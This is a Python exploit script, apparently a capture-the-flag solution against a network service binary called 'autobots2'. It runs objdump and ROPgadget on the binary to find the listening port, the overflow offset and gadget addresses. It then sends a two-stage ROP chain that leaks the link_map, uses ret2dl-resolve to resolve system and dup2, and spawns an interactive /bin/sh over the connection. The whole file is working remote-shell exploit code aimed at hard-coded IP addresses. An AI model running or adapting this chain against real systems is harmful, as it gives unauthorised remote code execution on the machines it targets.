#!/usr/bin/env python
from sc_pwn import *
from subprocess import check_output
from os import system
from time import sleep

#rhp     = ("52.20.10.244",8888)
rhp     = ("192.168.75.129",8888)

addr_dynsym         = 0x004002b8
addr_dynstr         = 0x004003d8
addr_gnu_version    = 0x0040044a
addr_relplt         = 0x004004a0

addr_buf            = 0x00601100
addr_stack          = addr_buf + 0xe00

addr_plt_reloc      = 0x004005d0
addr_plt_write      = 0x004005e0
addr_plt_memset     = 0x00400610
addr_plt_read       = 0x00400620
addr_plt_main       = 0x00400630
addr_got            = 0x00601000
addr_got_main       = 0x00601040

fname   = 'autobots2'
str_sh  = '/bin/sh\x00'

#==========
def attack(nc,offset):
    cmd = 'ROPgadget.py --binary %s | grep -e "pop rdi" -e "pop rsi" -e ": pop rbp ; ret" -e "leave"' % fname
    gadgets         = check_output(cmd, shell=True).split('\n')
    addr_leave_ret  = int(gadgets[0].split(' ')[0],16)
    addr_pop_rbp    = int(gadgets[1].split(' ')[0],16)
    addr_pop_rdi    = int(gadgets[2].split(' ')[0],16)
    addr_pop_x2     = int(gadgets[3].split(' ')[0],16)
    
    info('addr_leave_ret    = 0x%08x'%addr_leave_ret)
    
    exploit_st1  = 'a'*offset
    exploit_st1 += pack_64(addr_stack)
    exploit_st1 += pack_64(addr_pop_rdi)
    exploit_st1 += pack_64(4)
    exploit_st1 += pack_64(addr_pop_x2)
    exploit_st1 += pack_64(addr_got+0x8)
    exploit_st1 += pack_64(0xcafebabe)
    exploit_st1 += pack_64(addr_plt_write)
    exploit_st1 += pack_64(addr_pop_rdi)
    exploit_st1 += pack_64(4)
    exploit_st1 += pack_64(addr_pop_x2)
    exploit_st1 += pack_64(addr_buf)
    exploit_st1 += pack_64(0xcafebabe)
    exploit_st1 += pack_64(addr_plt_read)
    exploit_st1 += pack_64(addr_pop_rdi)
    exploit_st1 += pack_64(4)
    exploit_st1 += pack_64(addr_pop_x2)
    exploit_st1 += pack_64(addr_stack)
    exploit_st1 += pack_64(0xcafebabe)
    exploit_st1 += pack_64(addr_plt_read)
    exploit_st1 += pack_64(addr_leave_ret)
    sleep(1)
    nc.send(exploit_st1)

    sleep(1)
    addr_link_map = unpack_64(nc.read_all()[:8])
    info('addr_link_map     = 0x%08x'%addr_link_map)
    
    dl = DLresolve('amd64',addr_dynsym, addr_dynstr, addr_relplt)
    dl.set_funcadr(addr_stack, 'system')
    dl.set_funcadr(addr_got_main, 'dup2')
    dlr = dl.resolve(addr_buf)
    sleep(1)
    nc.sendln(dlr + str_sh)
    
    addr_buf_str_sh      = addr_buf + len(dlr)
    
    exploit_st2  = pack_64(0xdeadbeef)
    exploit_st2 += pack_64(addr_pop_rdi)
    exploit_st2 += pack_64(addr_link_map+0x1c8)
    exploit_st2 += pack_64(addr_pop_x2)
    exploit_st2 += pack_64(0)
    exploit_st2 += pack_64(0xcafebabe)
    exploit_st2 += pack_64(addr_plt_memset)
    exploit_st2 += pack_64(addr_pop_rdi)
    exploit_st2 += pack_64(4)
    exploit_st2 += pack_64(addr_pop_x2)
    exploit_st2 += pack_64(0)
    exploit_st2 += pack_64(0xcafebabe)
    exploit_st2 += pack_64(addr_plt_reloc)
    exploit_st2 += pack_64(dl.offset('dup2'))
    exploit_st2 += pack_64(addr_pop_rdi)
    exploit_st2 += pack_64(4)
    exploit_st2 += pack_64(addr_pop_x2)
    exploit_st2 += pack_64(1)
    exploit_st2 += pack_64(0xcafebabe)
    exploit_st2 += pack_64(addr_plt_main)
    exploit_st2 += pack_64(addr_pop_rdi)
    exploit_st2 += pack_64(addr_buf_str_sh)
    exploit_st2 += pack_64(addr_plt_reloc)
    exploit_st2 += pack_64(dl.offset('system'))
    sleep(1)
    nc.send(exploit_st2)
    
def get_info():
    #cmd = 'nc %s %d > %s' % (rhp[0],rhp[1],fname)
    #system(cmd)
    
    cmd = 'all-objdump -b elf64-x86-64 -M intel -d %s | grep -e htons -e read -1 | grep -e lea -e "mov    edi"' % fname
    rsp     = check_output(cmd, shell=True).split('\n')
    port    = int(rsp[1].split(',')[-1],16)
    offset  = int(rsp[2].split(',')[-1].split('-')[1][:-1],16)

    info('port              : %d'%port)
    info('offset            : 0x%08x'%offset)
    return port,offset

#==========

if __name__=='__main__':
    port,offset = get_info()
    nc = Communicate((rhp[0],port))
    attack(nc,offset)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
